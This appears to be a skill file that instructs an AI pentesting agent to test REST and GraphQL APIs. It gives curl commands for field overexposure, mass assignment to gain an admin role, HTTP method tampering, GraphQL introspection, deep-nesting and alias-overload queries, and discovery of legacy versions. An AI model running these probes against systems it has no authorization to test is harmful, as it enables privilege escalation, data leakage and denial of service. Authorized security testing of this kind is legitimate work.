---
name: api_test
description: "API 安全测试 (REST/GraphQL)。Use when: 目标有 API 端点或 GraphQL 接口 — 测试批量赋值、过度暴露、查询深度、速率限制"
allowed-tools:
  - execute
  - http_request
  - browser
  - create_candidate_finding
  - confirm_finding
  - reject_finding
phase: scan
disable_model_invocation: false
---

# API 安全测试

## Part A: REST API

### A1. 过度暴露

```bash
# 获取用户列表 — 检查响应是否包含敏感字段
curl -sk "https://TARGET/api/users" -H "Cookie: $SESSION" | python3 -m json.tool | head -50
# 检查: password_hash, token, secret, ssn, credit_card, api_key

# 尝试请求更多字段
curl -sk "https://TARGET/api/users?include=password,token,secret" -H "Cookie: $SESSION"
curl -sk "https://TARGET/api/users?fields=*" -H "Cookie: $SESSION"
curl -sk "https://TARGET/api/users?expand=profile,credentials" -H "Cookie: $SESSION"
```

如果 API 返回 password_hash 或 token → `create_candidate_finding(severity="high", title="API 过度暴露敏感字段")`

### A2. 批量赋值

```bash
# 修改不应由用户控制的字段
curl -sk -X PATCH "https://TARGET/api/users/me" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d '{"role": "admin", "is_admin": true, "verified": true, "balance": 99999}'
# 如果成功修改 role → create_candidate_finding(severity="critical")

# 批量创建
curl -sk -X POST "https://TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username": "newadmin", "password": "test", "role": "admin"}'
```

### A3. HTTP 方法篡改

```bash
# 尝试用不同方法访问受保护端点
curl -sk -X PUT "https://TARGET/api/admin/users" -H "Cookie: $SESSION_VIEWER"
curl -sk -X PATCH "https://TARGET/api/admin/users" -H "Cookie: $SESSION_VIEWER"
curl -sk -X HEAD "https://TARGET/api/admin/users" -H "Cookie: $SESSION_VIEWER"
# 如果 PUT/PATCH 绕过权限 → IDOR
```

## Part B: GraphQL

### B1. 端点发现

```bash
for path in /graphql /graphiql /gql /query /api/graphql /playground /v1/graphql; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET$path")
  echo "$status $path"
done
```

### B2. 内省查询

```bash
# 标准内省
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name,args{name,type{name}}}}}"}'

# 如果内省关闭，尝试字段建议
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{_typename}"}'  # 探测

# 尝试常见字段名
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{users{id,email,password}}"}'
```

### B3. 查询深度攻击

```bash
# 深层嵌套 (可能触发 DoS 或绕过授权)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { users { posts { author { posts { author { posts { id } } } } } }"}'

# 别名超载 (绕过速率限制)
curl -sk -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { a1:user(id:1){email} a2:user(id:2){email} ... a50:user(id:50){email} }"}'

# 批量查询
curl -sk -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]'
```

## Part C: API 版本差异

```bash
# 检查不同 API 版本的认证要求
curl -sk "https://TARGET/api/v1/admin/users" -o /dev/null -w "v1: %{http_code}\n"
curl -sk "https://TARGET/api/v2/admin/users" -o /dev/null -w "v2: %{http_code}\n"
# v1 无认证但 v2 有 = v1 遗留漏洞

# Swagger/OpenAPI 文档泄露
curl -sk "https://TARGET/swagger.json" -o /dev/null -w "%{http_code}"
curl -sk "https://TARGET/api-docs" -o /dev/null -w "%{http_code}"
curl -sk "https://TARGET/openapi.json" -o /dev/null -w "%{http_code}"
```
